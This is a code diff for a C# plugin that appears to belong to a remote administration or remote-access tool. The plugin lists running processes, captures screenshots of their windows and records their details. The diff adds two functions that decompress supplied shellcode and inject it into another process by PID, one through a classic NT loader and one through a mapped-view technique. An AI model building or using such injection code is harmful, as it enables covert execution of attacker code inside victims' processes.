@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Shared;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
@@ -40,22 +41,17 @@ namespace Plugin
 
 							azo.Save(stream, ImageFormat.Png);
 
-							P_details.Add(P.ProcessName);
+							P_details.Add(P.ProcessName);//0
 
-							try
-							{
-								P_details.Add(P.Id);
-							}
-							catch (Exception)
-							{
-								P_details.Add("Cannot get PID");
-							}
+							P_details.Add(P.Id);//1
 
-							P_details.Add(P.MainWindowTitle);
+							P_details.Add(P.MainWindowTitle);//2
 
-							P_details.Add(P.MainWindowHandle.ToString());
+							P_details.Add(P.MainWindowHandle.ToString());//3
 
-							P_details.Add(stream.ToArray());
+							P_details.Add(Utils.CheckIf64Bit(P.Handle));//4
+
+							P_details.Add(stream.ToArray());//5
 
 							Proc.Add(P_details.ToArray());
 						}
@@ -70,10 +66,12 @@ namespace Plugin
 							P_details.Add(P.Id);
 							P_details.Add(P.MainWindowTitle);
 							P_details.Add(P.MainWindowHandle.ToString());
+							P_details.Add(Utils.CheckIf64Bit(P.Handle));
+
 						}
 						catch (Exception)
 						{
-							P_details.Add("Cannot get PID");
+							P_details.Add("?");
 							P_details.Add(P.MainWindowTitle);
 							P_details.Add(P.MainWindowHandle.ToString());
 						}
@@ -205,7 +203,6 @@ namespace Plugin
 		internal static void MinimizeWindow(int PID) 
 		{
 			IntPtr result = NativeAPI.Miscellaneous.SendMessage(Process.GetProcessById(PID).MainWindowHandle, NativeAPI.Miscellaneous.WM_Message.WM_SYSCOMMAND, NativeAPI.Miscellaneous.SC_Message.SC_MINIMIZE, IntPtr.Zero);
-
 		}
 		internal static void MaximizeWindow(int PID)
 		{
@@ -218,6 +215,17 @@ namespace Plugin
 		internal static void ShowWindow(IntPtr WindowHandle)
 		{
 			NativeAPI.Miscellaneous.ShowWindow(WindowHandle, 5);
+		}
+		internal static void InjectShellCodeClassicMethod(int PID, byte[] shellcode) 
+		{
+			ShellCodeLoader.ShellCodeLoaderEx shellCodeLoaderEx = new ShellCodeLoader.ShellCodeLoaderEx(Process.GetProcessById(PID), Compressor.QuickLZ.Decompress(shellcode));
+			shellCodeLoaderEx.LoadWithNT();
+		}
+
+		internal static void InjectShellCodeMapView(int PID, byte[] shellcode)
+		{
+			ShellCodeLoader.MapView mapView = new ShellCodeLoader.MapView(Process.GetProcessById(PID), Compressor.QuickLZ.Decompress(shellcode));
+			mapView.LoadWithNtMapView();
 		}
 	}
 }
